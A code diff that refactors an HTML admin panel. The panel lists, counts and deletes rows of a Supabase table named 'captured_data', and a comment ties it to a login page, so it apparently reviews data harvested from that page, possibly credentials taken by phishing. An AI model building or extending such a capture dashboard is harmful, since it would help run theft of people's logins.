@@ -10,7 +10,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
@@ -138,6 +138,12 @@
             padding: 50px;
             color: #999;
         }
+
+        .error-state {
+            text-align: center;
+            padding: 50px;
+            color: #f44336;
+        }
     </style>
 </head>
 <body>
@@ -182,30 +188,36 @@
     </div>
 
     <script>
-        // Supabase configuration
-        const SUPABASE_URL = 'https://aqynejlgjwdmxsekkuld.supabase.co';
-        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
+        // Supabase configuration - SAME as login page
+        const supabaseUrl = 'https://aqynejlgjwdmxsekuyld.supabase.co';
+        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
         
         // Initialize Supabase
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
+        const db = window.supabase.createClient(supabaseUrl, supabaseKey);
         
-        async function loadData() {
+        // Make loadData globally accessible
+        window.loadData = async function() {
+            console.log('Loading data from Supabase...');
+            
             try {
-                const { data, error } = await supabase
+                const { data, error } = await db
                     .from('captured_data')
                     .select('*')
                     .order('created_at', { ascending: false })
                     .limit(100);
                 
                 if (error) {
-                    console.error('Error:', error);
+                    console.error('Error loading data:', error);
                     document.getElementById('tableBody').innerHTML = 
-                        `<tr><td colspan="6" style="text-align:center;color:red;">Error: ${error.message}</td></tr>`;
+                        `<tr><td colspan="6" class="error-state">Error: ${error.message}</td></tr>`;
                     return;
                 }
                 
+                console.log('Data loaded:', data);
+                
                 document.getElementById('totalCount').textContent = data.length;
                 
+                // Count today's captures
                 const today = new Date().toDateString();
                 const todayCount = data.filter(item => 
                     new Date(item.created_at).toDateString() === today
@@ -232,39 +244,44 @@
                     </tr>
                 `).join('');
                 
-            } catch (error) {
-                console.error('Error:', error);
+            } catch (err) {
+                console.error('Error:', err);
                 document.getElementById('tableBody').innerHTML = 
-                    '<tr><td colspan="6" style="text-align:center;color:red;">Error loading data.</td></tr>';
+                    `<tr><td colspan="6" class="error-state">Connection error: ${err.message}</td></tr>`;
             }
-        }
+        };
         
-        async function deleteEntry(id) {
+        // Make deleteEntry globally accessible
+        window.deleteEntry = async function(id) {
             if (!confirm('Delete this entry?')) return;
             
             try {
-                const { error } = await supabase
+                const { error } = await db
                     .from('captured_data')
                     .delete()
                     .eq('id', id);
                 
-                if (error) throw error;
-                loadData();
-            } catch (error) {
-                console.error('Error deleting:', error);
+                if (error) {
+                    console.error('Error deleting:', error);
+                    alert('Error deleting entry: ' + error.message);
+                } else {
+                    console.log('✅ Entry deleted successfully');
+                    loadData();
+                }
+            } catch (err) {
+                console.error('Error:', err);
                 alert('Error deleting entry');
             }
-        }
+        };
         
-        // Load data on page load
-        loadData();
+        // Load data when page loads
+        window.addEventListener('DOMContentLoaded', function() {
+            console.log('Admin panel loaded');
+            loadData();
+        });
         
         // Auto-refresh every 30 seconds
         setInterval(loadData, 30000);
-        
-        // Make functions globally accessible
-        window.loadData = loadData;
-        window.deleteEntry = deleteEntry;
     </script>
 </body>
 </html>
